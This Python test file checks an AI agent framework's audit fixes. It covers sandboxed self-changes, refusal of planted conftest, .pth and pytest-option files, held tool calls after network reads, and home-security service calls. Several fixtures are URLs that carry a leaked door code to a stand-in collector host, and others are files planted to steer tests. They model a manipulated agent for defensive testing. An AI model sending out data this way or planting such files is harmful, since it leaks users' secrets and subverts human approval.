# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 A.U.R.O.R.A. Project
"""C590, the audit of 12 Nov on the agents: what is applied is what was approved; what comes from the network is
decided in the core; nothing leaves after a network read; «named» reads the identifying fields; a cover is a cover
under any service's domain."""
import importlib.util
import shutil
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

from aurora import agt_asked, agt_change, hom_safety, sys_ethics, sys_tests
from aurora.agt_loop import Agent

OK = {"ok": True, "summary": "1 passed", "output": ""}


@pytest.fixture(autouse=True)
def _a_log_of_the_tests_own(cfg):
    """apply() writes its audit line: the log goes to the test's folder also where no installation's .env is (the
    tests run alone, or in the mirror, found none and stopped at the logger)."""


# ---- E1: the bytes approved are the bytes applied ---------------------------------------------------------------------
def _box(tmp_path):
    live, sand = tmp_path / "live", tmp_path / "sandboxes"
    box = sand / "fix1"
    for root, text in ((live, "a = 1\n"), (box, "a = 2\n"), (box / ".base", "a = 1\n")):
        (root / "sys/core/aurora").mkdir(parents=True)
        (root / "sys/core/aurora/a.py").write_text(text)
    (live / "pyproject.toml").write_text("[tool.pytest.ini_options]\n")
    shutil.copy2(live / "pyproject.toml", box / "pyproject.toml")
    return live, box, SimpleNamespace(root=live, path=lambda key: sand)


def test_a_file_rewritten_during_apply_s_own_test_run_is_not_applied(tmp_path, monkeypatch):
    live, box, cfg = _box(tmp_path)
    approved = agt_change.fingerprint(box, ["sys/core/aurora/a.py"])

    def tests_that_rewrite(base, **k):                 # what a file planted in the sandbox did while the tests ran
        if base == box:
            (box / "sys/core/aurora/a.py").write_text("a = 2\nextra = True\n")
        return OK
    monkeypatch.setattr(sys_tests, "run_suite", tests_that_rewrite)
    out = agt_change.apply("fix1", lambda e, p: None, cfg, restart=False, expect=approved)
    assert not out["applied"] and "while its tests ran" in out["reason"]
    assert (live / "sys/core/aurora/a.py").read_text() == "a = 1\n"


def test_a_file_added_during_the_test_run_stops_the_change_too(tmp_path, monkeypatch):
    live, box, cfg = _box(tmp_path)

    def tests_that_add(base, **k):
        if base == box:
            (box / "sys/core/aurora/new.py").write_text("x = 1\n")
        return OK
    monkeypatch.setattr(sys_tests, "run_suite", tests_that_add)
    out = agt_change.apply("fix1", lambda e, p: None, cfg, restart=False)       # no approval kept: its own print
    assert not out["applied"] and not (live / "sys/core/aurora/new.py").exists()
    assert (live / "sys/core/aurora/a.py").read_text() == "a = 1\n"


def test_an_untouched_change_is_applied_as_before(tmp_path, monkeypatch):
    live, box, cfg = _box(tmp_path)
    monkeypatch.setattr(sys_tests, "run_suite", lambda *a, **k: OK)
    approved = agt_change.fingerprint(box, ["sys/core/aurora/a.py"])
    assert agt_change.apply("fix1", lambda e, p: None, cfg, restart=False, expect=approved)["applied"]
    assert (live / "sys/core/aurora/a.py").read_text() == "a = 2\n"


@pytest.mark.parametrize("name", ["conftest.py", "pytest.ini", "sys/plugins/x/conftest.py", "evil.pth"])
def test_a_sandbox_with_a_file_that_steers_the_tests_is_refused(tmp_path, monkeypatch, name):
    live, box, cfg = _box(tmp_path)
    (box / name).parent.mkdir(parents=True, exist_ok=True)
    (box / name).write_text("import os\n")
    ran = []
    monkeypatch.setattr(sys_tests, "run_suite", lambda *a, **k: ran.append(a) or OK)
    assert agt_change.strays(box, live) == [name]
    out = agt_change.apply("fix1", lambda e, p: None, cfg, restart=False)
    assert not out["applied"] and name in out["reason"] and not ran            # refused before any test ran
    assert (live / "sys/core/aurora/a.py").read_text() == "a = 1\n"


def test_the_live_code_s_own_root_files_are_not_strays(tmp_path):
    live, box, cfg = _box(tmp_path)
    assert agt_change.strays(box, live) == []
    (box / "pyproject.toml").write_text("[tool.pytest.ini_options]\naddopts = '-p evil'\n")
    assert agt_change.strays(box, live) == ["pyproject.toml"]


def test_the_sandbox_s_tests_run_with_the_sandbox_read_only(tmp_path, monkeypatch):
    ran = []
    monkeypatch.setattr(sys_tests.subprocess, "run",
                        lambda cmd, **kw: ran.append(cmd) or subprocess.CompletedProcess(cmd, 0, "1 passed", ""))
    (tmp_path / "sys/core/tests").mkdir(parents=True)
    (tmp_path / "pyproject.toml").write_text("")
    sys_tests.run_suite(tmp_path, caged=True)
    cmd = ran[0]
    pairs = lambda flag: [cmd[i + 1] for i, a in enumerate(cmd) if a == flag]
    assert cmd[0] == "bwrap" and str(tmp_path / "sys/core") in pairs("--ro-bind")
    assert not any(w == str(tmp_path) or w.startswith(str(tmp_path) + "/") for w in pairs("--bind"))
    assert len(pairs("--bind")) == 1 and "aurora-box-tests-" in pairs("--bind")[0]


@pytest.mark.skipif(not shutil.which("bwrap"), reason="no bubblewrap here")
def test_in_the_real_cage_a_planted_conftest_cannot_write_the_sandbox(tmp_path):
    box = tmp_path / "box"
    (box / "sys/core/tests").mkdir(parents=True)
    (box / "sys/core/aurora").mkdir()
    (box / "sys/core/aurora/unit.py").write_text("X = 1\n")
    (box / "pyproject.toml").write_text("[tool.pytest.ini_options]\n")
    (box / "sys/core/tests/test_ok.py").write_text(
        "from pathlib import Path\n"
        "def test_ok():\n"
        "    try:\n"
        f"        Path({str(box / 'sys/core/aurora/unit.py')!r}).write_text('X = 2\\n')\n"
        "    except OSError:\n"
        "        pass\n")
    r = sys_tests.run_suite(box, caged=True)
    if not r["ok"] and "passed" not in r["summary"]:
        pytest.skip(f"the cage does not start here: {r['output'][-200:]}")
    assert (box / "sys/core/aurora/unit.py").read_text() == "X = 1\n"


# ---- E2: from the network, by the core -------------------------------------------------------------------------------
def test_a_read_tool_of_a_plugin_that_reaches_the_network_is_from_the_network():
    net = {"sandbox": {"network": True}}
    assert agt_asked.outside(net, "codehost", "get_issue", "read")             # no from_network in its manifest
    assert agt_asked.outside({"sandbox": {"network": "proxy"}}, "forged_one", "read_feed", "read")
    assert agt_asked.outside({"url": "https://mcp.example.org"}, "remote", "search", "read")
    assert not agt_asked.outside({"sandbox": {"network": False}}, "notes", "notes_read", "read")
    assert not agt_asked.outside({"sandbox": {"network": "local"}}, "vista", "vista_info", "read")
    assert not agt_asked.outside(net, "weather", "forecast", "read")           # the core's own list
    assert not agt_asked.outside({**net, "home_commands": ["call_service"]}, "homeassistant", "states", "read")
    assert agt_asked.outside({**net, "home_commands": ["x"], "forged": True}, "ha_made", "states", "read")


def test_the_core_s_answer_reaches_the_honeypot_and_the_narrowing():
    from aurora import sec_detonate
    p = SimpleNamespace(manifest={"sandbox": {"network": True}, "from_network": ["a"]})
    agt_asked.widen(p, "codehost", "get_issue", "read")
    agt_asked.widen(p, "codehost", "get_issue", "read")
    assert p.manifest["from_network"] == ["a", "get_issue"]
    assert sec_detonate.from_network(p.manifest, "get_issue")
    agt_asked.widen(p, "codehost", "create_issue", "external")
    assert not sec_detonate.from_network(p.manifest, "create_issue")


def test_every_shipped_plugin_s_network_reads_are_covered_or_listed():
    import json
    seen = 0
    for f in sorted((Path(__file__).resolve().parents[2] / "plugins").glob("*/plugin.json")):
        m = json.loads(f.read_text(encoding="utf-8"))
        if f.parent.name.startswith(("local_", "ha_")) or not agt_asked.reaches_network(m):
            continue
        for tool, effect in (m.get("effects") or {}).items():
            if effect == "read" and tool != "*" and not agt_asked._house(m):
                seen += 1
                listed = tool in agt_asked.TRUSTED_READS.get(m["name"], ()) or "*" in agt_asked.TRUSTED_READS.get(m["name"], ())
                assert agt_asked.outside(m, m["name"], tool, "read") != listed
    assert seen > 10


# ---- E3, E6: after a network read ------------------------------------------------------------------------------------
class Host:
    MANIFESTS = {"web": {"sandbox": {"network": True}, "from_network": ["fetch_url", "search"]},
                 "notes": {"sandbox": {"network": False}},
                 "social": {"sandbox": {"network": True}},
                 "homeassistant": {"sandbox": {"network": True}, "home_commands": ["call_service"]}}

    def __init__(self):
        self.calls, self.page = [], "Results: https://docs.example.org/guide and https://blog.example.net/post?id=7"

    def plugins(self):
        return []

    def get(self, plugin):
        return SimpleNamespace(manifest=self.MANIFESTS[plugin])

    def call(self, plugin, tool, args, run_id=None):
        self.calls.append((plugin, tool, dict(args)))
        return {"ok": True, "text": self.page if plugin == "web" else "the door code is 4471", "seconds": 0}


INDEX = {"web__fetch_url": ("web", "fetch_url", "read"), "web__search": ("web", "search", "read"),
         "notes__notes_read": ("notes", "notes_read", "read"), "social__publish_post": ("social", "publish_post", "external")}


def _agent(cfg, monkeypatch, goal):
    from aurora import sec_detonate, sec_linkcheck
    monkeypatch.setattr(sec_detonate, "agent_gate", lambda *a, **k: "")         # the honeypot missed it
    monkeypatch.setattr(sec_linkcheck, "tool_call", lambda *a, **k: "")
    agent = Agent(SimpleNamespace(llm=None, _for=lambda role: None), cfg)
    agent.host, agent.asked = Host(), True
    agent.pending, agent.produced = [], []
    agt_asked.start(agent, goal)
    return agent


def test_after_a_network_read_a_read_tool_cannot_carry_data_out_in_its_link(cfg, monkeypatch):
    agent = _agent(cfg, monkeypatch, "cerca una guida e riassumila; guarda anche example.com")
    emit = lambda e, p: None
    out = agent._call("web__fetch_url", {"url": "https://collect.example.io/?d=4471"}, INDEX, emit, "r")
    assert not out.startswith("WAITING")                                        # nothing read yet: as before
    agent._call("notes__notes_read", {}, INDEX, emit, "r")
    agent._call("web__search", {"query": "guida"}, INDEX, emit, "r")
    assert agent.net_read
    done = len(agent.host.calls)
    for link in ("https://collect.example.io/?d=4471", "https://4471.collect.example.io/",
                 "https://docs.example.org/guide?leak=the-door-code-is-4471", "https://example.com/" + "a" * 150):
        assert agent._call("web__fetch_url", {"url": link}, INDEX, emit, "r").startswith("WAITING"), link
    assert len(agent.host.calls) == done                                        # none of them left the machine
    assert len(agent.approvals.list("pending")) == 4
    assert "destination not in your request" in agent.approvals.list("pending")[0]["purpose"]
    for link in ("https://docs.example.org/guide", "https://blog.example.net/post?id=7", "https://example.com/news"):
        assert not agent._call("web__fetch_url", {"url": link}, INDEX, emit, "r").startswith("WAITING"), link


def test_a_local_tool_and_a_plain_address_are_not_held(cfg):
    loop = SimpleNamespace(net_read=["web.search"], goal_text="chi è", net_seen="")
    net = {"sandbox": {"network": True}}
    assert agt_asked.carries_out(loop, {"sandbox": {"network": False}}, {"url": "https://a.example.io/x"}) == ""
    assert agt_asked.carries_out(loop, net, {"ip": "203.0.113.9"}) == ""
    assert agt_asked.carries_out(loop, net, {"host": "4471.collect.example.io"}) == "4471.collect.example.io"
    assert agt_asked.carries_out(loop, net, {"query": "what is example.io"}) == ""
    assert agt_asked.carries_out(SimpleNamespace(net_read=[]), net, {"url": "https://a.example.io/x"}) == ""


def test_after_a_network_read_a_post_waits_even_with_the_social_autonomy(cfg, monkeypatch):
    monkeypatch.setattr(sys_ethics, "exempt", lambda c=None: True)
    cfg.values["AURORA_CONFIRM_EXTERNAL_ACTIONS"] = False
    agent = _agent(cfg, monkeypatch, "pubblica il post del giorno")
    emit = lambda e, p: None
    assert not agent._call("social__publish_post", {"text": "ciao"}, INDEX, emit, "r").startswith("WAITING")
    agent._call("web__search", {"query": "notizie"}, INDEX, emit, "r")
    assert agent._call("social__publish_post", {"text": "ciao"}, INDEX, emit, "r").startswith("WAITING")
    assert [c[:2] for c in agent.host.calls].count(("social", "publish_post")) == 1


def test_after_a_network_read_a_self_change_is_never_applied_by_the_run(cfg, monkeypatch):
    box = cfg.path("AURORA_SANDBOX_DIR") / "tiny-change"
    (box / "sys" / "core").mkdir(parents=True)
    monkeypatch.setattr(agt_change, "changed_files", lambda b, r: ["sys/core/aurora/x.py"])
    monkeypatch.setattr(agt_change, "fingerprint", lambda b, f: {"sys/core/aurora/x.py": "0"})
    monkeypatch.setattr(agt_change, "strays", lambda b, r: [])
    monkeypatch.setattr(sys_tests, "run_suite", lambda b, caged=False: OK)
    monkeypatch.setattr(sys_ethics, "exempt", lambda c=None: True)
    cfg.values["AURORA_SELF_CHANGE_MODE"] = "auto"
    applied = []
    monkeypatch.setattr(agt_change, "apply", lambda *a, **k: applied.append(a) or {"applied": True})
    agent = Agent(SimpleNamespace(llm=None, _for=lambda role: None), cfg)
    agent.host = SimpleNamespace(call=lambda p, t, a, r: {"ok": True, "text": "+x"})
    agent.net_read = ["web.fetch_url"]
    assert agent._propose({"sandbox_id": "tiny-change", "title": "t"}, lambda e, p: None, "r").startswith("PROPOSED")
    assert not applied
    agent.net_read = []
    assert agent._propose({"sandbox_id": "tiny-change", "title": "t"}, lambda e, p: None, "r").startswith("APPLIED")


# ---- E4: «named» reads the identifying fields only --------------------------------------------------------------------
def test_a_goal_word_in_a_text_argument_names_nothing():
    goal = "Leggi la posta e dimmi cosa dice il corriere sul pacco"
    assert not agt_asked.named(goal, "phone_action", {"action": "message", "contact": "Zed", "text": "il pacco del corriere"})
    assert not agt_asked.named(goal, "call_service", {"domain": "switch", "service": "turn_on", "entity_id": "switch.forno",
                                                      "data": {"note": "corriere pacco"}})
    assert not agt_asked.named(goal, "phone_action", {"action": "open_url", "url": "https://prize.example.net/corriere/pacco"})
    assert not agt_asked.named("accendi la luce", "call_service", {"entity_id": "switch.forno", "data": {"x": "light.fake"}})
    assert not agt_asked.named("accendi la luce", "notify", {"message": "light.kitchen is on"})


def test_the_identifying_fields_still_name():
    assert agt_asked.named("accendi la luce", "call_service", {"entity_id": "light.corridoio"})
    assert agt_asked.named("chiudi il garage", "call_service", {"domain": "cover", "service": "close_cover", "entity_id": "cover.garage"})
    assert agt_asked.named("apri example.org sul telefono", "phone_action", {"action": "open_url", "url": "https://www.example.org/a"})
    assert agt_asked.named("chiama Zed", "phone_action", {"action": "call", "contact": "Zed Example"}) is False   # 3 letters
    assert agt_asked.named("chiama Marta", "phone_action", {"action": "call", "contact": "Marta Example"})
    assert agt_asked.named("apri Zed", "phone_action", {"action": "open_app", "app": "Zed"})
    assert agt_asked.named("chiama il 555 010 0199", "phone_action", {"action": "call", "number": "+39 5550100199"}) is False
    assert agt_asked.named("chiama il 555 010 0199", "phone_action", {"action": "call", "number": "555-0100199"})
    assert agt_asked.named("cerca sul telefono ricette di pasta fresca", "phone_action",
                           {"action": "web_search", "query": "ricette pasta fresca"})
    assert not agt_asked.named("cerca sul telefono ricette di pasta fresca", "phone_action",
                               {"action": "web_search", "query": "pasta premio vincita gratis subito"})


# ---- E5: the entity's own domain ------------------------------------------------------------------------------------
HA = {"home_commands": ["call_service"]}


@pytest.mark.parametrize("args", [
    {"domain": "homeassistant", "service": "toggle", "entity_id": "cover.garage"},
    {"domain": "homeassistant", "service": "turn_on", "entity_id": "cover.garage"},
    {"domain": "homeassistant", "service": "turn_off", "entity_id": "lock.front"},
    {"domain": "homeassistant", "service": "turn_off", "entity_id": "alarm_control_panel.house"},
    {"domain": "homeassistant", "service": "toggle", "entity_id": "light.a, cover.garage"},
    {"domain": "homeassistant", "service": "toggle", "entity_id": ["light.a", "cover.garage"]},
    {"domain": "light", "service": "toggle", "entity_id": "light.a", "data": {"entity_id": "cover.garage"}},
    {"domain": "light", "service": "toggle", "entity_id": "light.a", "data": {"target": {"entity_id": ["cover.garage"]}}},
    {"domain": "homeassistant", "service": "toggle", "entity_id": "light.a", "data": {"area_id": "garage"}},
    {"domain": "homeassistant", "service": "turn_on", "entity_id": "group.all_covers"},
    {"domain": "homeassistant", "service": "toggle", "entity_id": "all"},
    {"service": "cover.open_cover", "entity_id": "cover.garage"},
    {"domain": "cover", "service": "open_cover", "entity_id": "cover.garage"},
    {"domain": "lock", "service": "unlock", "entity_id": "lock.front"},
])
def test_a_call_that_lowers_the_house_s_security_is_seen_under_any_domain(args):
    assert hom_safety.call_lowers(HA, "call_service", args)


@pytest.mark.parametrize("args", [
    {"domain": "homeassistant", "service": "toggle", "entity_id": "light.a"},
    {"domain": "homeassistant", "service": "turn_off", "entity_id": "cover.garage"},
    {"domain": "light", "service": "turn_on", "entity_id": "light.a", "data": {"brightness_pct": 60}},
    {"domain": "cover", "service": "close_cover", "entity_id": "cover.garage"},
    {"domain": "switch", "service": "toggle", "entity_id": "switch.plug"},
    {"entity_id": "cover.garage"},
])
def test_what_does_not_lower_it_goes_as_before(args):
    assert not hom_safety.call_lowers(HA, "call_service", args)


def test_an_automation_s_generic_service_on_a_cover_lowers_it():
    assert hom_safety.action_lowers({"entity_id": "cover.garage", "service": "toggle"})
    assert hom_safety.action_lowers({"entity_id": "cover.garage", "service": "homeassistant.turn_on"})
    assert not hom_safety.action_lowers({"entity_id": "light.a", "service": "turn_on"})


def test_the_plugin_refuses_a_target_inside_data(monkeypatch):
    spec = importlib.util.spec_from_file_location(
        "ha_server_c590", Path(__file__).resolve().parents[2] / "plugins" / "homeassistant" / "server.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    sent = []
    monkeypatch.setattr(mod, "_api", lambda method, path, **kw: sent.append((path, kw.get("json"))) or [])
    for data in ({"entity_id": "cover.garage"}, {"target": {"entity_id": "cover.garage"}}, {"area_id": "garage"}):
        with pytest.raises(Exception, match="entity_id"):
            mod.call_service("light", "toggle", "light.a", data)
    with pytest.raises(Exception, match="plain names"):
        mod.call_service("light/../cover", "open_cover", "light.a")
    assert not sent
    mod.call_service("light", "turn_on", "light.a", {"brightness_pct": 60})
    assert sent == [("/services/light/turn_on", {"brightness_pct": 60, "entity_id": "light.a"})]
